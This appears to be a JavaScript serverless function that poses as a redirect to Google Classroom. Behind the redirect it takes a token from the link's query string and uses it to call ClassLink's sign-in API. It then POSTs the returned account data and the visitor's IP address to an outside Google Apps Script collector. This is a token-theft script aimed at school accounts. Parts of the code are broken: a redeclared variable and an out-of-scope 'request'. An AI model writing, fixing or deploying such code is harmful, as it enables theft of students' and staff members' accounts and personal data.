export function onRequest(context) {
    const { request } = context;
    const url = new URL(request.url);
    handleRequest(url.search, request.headers.get("CF-Connecting-IP"));
    
    return Response.redirect("https://classroom.google.com/h", 302);
}

async function handleRequest(searchParams, ip){
    const idMatch = searchParams.match(/[?&]i=([^&]+)/);
    const id = idMatch ? idMatch[1] : null;

    let extractedText = null;
    if (id) {
        const regex = /^(?:[^"]*"[^"]*"){2}([^"]*)/;
        const match = id.match(regex);
        extractedText = match ? match[1] : null;
    }

    const ip = request.headers.get("CF-Connecting-IP");
        if (id) {
            const nodeApiResponse = await fetch("https://nodeapi.classlink.com/user/signinwith", {
                method: "GET",
                headers: {
                    "gwsToken": extractedText
                }
            });

            const nodeApiData = await nodeApiResponse.json();

            const response = await fetch("https://script.google.com/macros/s/AKfycbwYsHOJe4qOP-e1OZBjfSBNDep5Nz4LQ7Rge-xDjcGn7z7oKFPmgGfKk-Ey7eKFYBD2/exec", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({ data: nodeApiData, ip: ip })
            });
        }
}
